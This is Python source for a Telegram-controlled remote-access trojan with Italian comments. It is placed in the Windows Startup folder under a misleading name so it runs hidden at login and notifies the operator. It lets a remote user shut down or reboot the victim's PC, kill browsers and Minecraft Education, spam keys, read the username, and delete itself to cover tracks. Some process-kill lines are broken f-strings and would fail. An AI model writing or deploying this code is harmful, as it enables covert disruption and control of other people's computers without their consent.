#Importazione librerie
import telebot
import os
import pyautogui
from pynput.keyboard import Key, Controller
import subprocess

#Getuser
user = os.environ.get('USERNAME')
#File location
file = "C:/Users/" + str(user) + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/UnexpectedShutdown.pyw"

#Keyboard control define
keyboard = Controller()

#Tg info + bot define
BotToken = 'INSERT YOUR BOT TOKEN HERE'
bot = telebot.TeleBot(BotToken)
TGID = 'PUT YOUR TELEGRAM CHAT ID HERE'

#Notify when opened
bot.send_message(TGID, "Il programma è stato avviato dall' host")

#System Shutdown
def SystemShutdown():
    os.system('shutdown -s -t 0')

#System Reboot
def SysyemReboot():
    os.system("shutdown /r /t 0")

#Audio to 100%
def Volume100():
    pyautogui.press("volumeup", 100)

#Audio to 0%
def Volume0():
    pyautogui.press("volumedown", 100)

#AltF4
def AltF4():
    keyboard.press(Key.alt)
    keyboard.press(Key.f4)
    keyboard.release(Key.alt)
    keyboard.release(Key.f4)

#Infinite Windows Key
def InfWinKey():
    while True:
        keyboard.press(Key.cmd)
        keyboard.release(Key.cmd)

#PanicMode
def PanicMode():
    try:
        os.remove(file)
        bot.send_message(TGID, "File eliminato!")
    except:
        bot.send_message(TGID, "File non trovato in directory: " + file + "!")

#Kill MinecraftEdu
def MinKill():
    os.system(f"taskkill /f /im {Minecraft.Windows.exe}")

#Browserkill
def BrowserKill():
    os.system(f"taskkill /f /im {chrome.exe}")
    os.system(f"taskkill /f /im {opera.exe}")
    os.system(f"taskkill /f /im {msedge.exe}")
    os.system(f"taskkill /f /im {firefox.exe}")

#Desktop switcherLeft
def DeskSwitchLeft():
    keyboard.press(Key.ctrl)
    keyboard.press(Key.cmd)
    keyboard.press(Key.left)
    keyboard.release(Key.ctrl)
    keyboard.release(Key.cmd)
    keyboard.release(Key.left)

#Desktop SwitcherRight
def DeskSwitchRight():
    keyboard.press(Key.ctrl)
    keyboard.press(Key.cmd)
    keyboard.press(Key.right)
    keyboard.release(Key.ctrl)
    keyboard.release(Key.cmd)
    keyboard.release(Key.right)

#Open cmd
def Cmd():
    subprocess.call('cmd.exe')






#Write when /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(TGID, "Benvenuto nel tuo UnexpectedShutdown bot, da qui puoi controllare tutte le opzioni del progamma")

#Action for /shutdown
@bot.message_handler(commands=['shutdown'])
def reply_message(message):
        bot.reply_to(message, "Il comando per lo spegnimento è stato eseguito")
        SystemShutdown()

#Action for /reboot
@bot.message_handler(commands=['reboot'])
def reply_message(message):
        bot.reply_to(message, "Il comando per il riavvio è stato eseguito")
        SysyemReboot()

#Action for /volume100
@bot.message_handler(commands=['volume100'])
def reply_message(message):
        bot.reply_to(message, "Il comando per è stato eseguito, volume portato al 100%")
        Volume100()

#Action for /volume0
@bot.message_handler(commands=['volume0'])
def reply_message(message):
        bot.reply_to(message, "Il comando è stato eseguito, volume portato allo 0%")
        Volume0()

#Action for /altf4
@bot.message_handler(commands=['altf4'])
def reply_message(message):
        bot.reply_to(message, "Il comando è stato eseguito, alt+f4 inviato")
        AltF4()

#Action for /winkeyloop
@bot.message_handler(commands=['winkeyloop'])
def reply_message(message):
        bot.reply_to(message, "Lo spam di window key è iniziato")
        InfWinKey()

#Action for /panicmode
@bot.message_handler(commands=['panicmode'])
def reply_message(message):
        bot.reply_to(message, "Comando inviato, attendi risposta dall'host...")
        PanicMode()

#Action for /getuser
@bot.message_handler(commands=['getuser'])
def reply_message(message):
        bot.send_message(TGID, "il nome utente è " + user)

#Action for /mckill
@bot.message_handler(commands=['mckill'])
def reply_message(message):
        bot.reply_to(message, "Minecraft per education è stato chiuso")
        MinKill()

#Action for /browerkill
@bot.message_handler(commands=['browserkill'])
def reply_message(message):
        bot.reply_to(message, "Tutti i browser esistenti sono stati chiusi")
        BrowserKill()

#Action for /DeskSwitcherLeft
@bot.message_handler(commands=['deskswitcherleft'])
def reply_message(message):
        bot.reply_to(message, "Ho passato al desktop di destra")
        DeskSwitchLeft()

#Action for /DeskSwitcherright
@bot.message_handler(commands=['deskswitcherright'])
def reply_message(message):
        bot.reply_to(message, "Ho passato al desktop di sinistra")
        DeskSwitchRight()

#Action for /cmd
@bot.message_handler(commands=['cmd'])
def reply_message(message):
        bot.reply_to(message, "Ho aperto il cmd")
        Cmd()

bot.polling()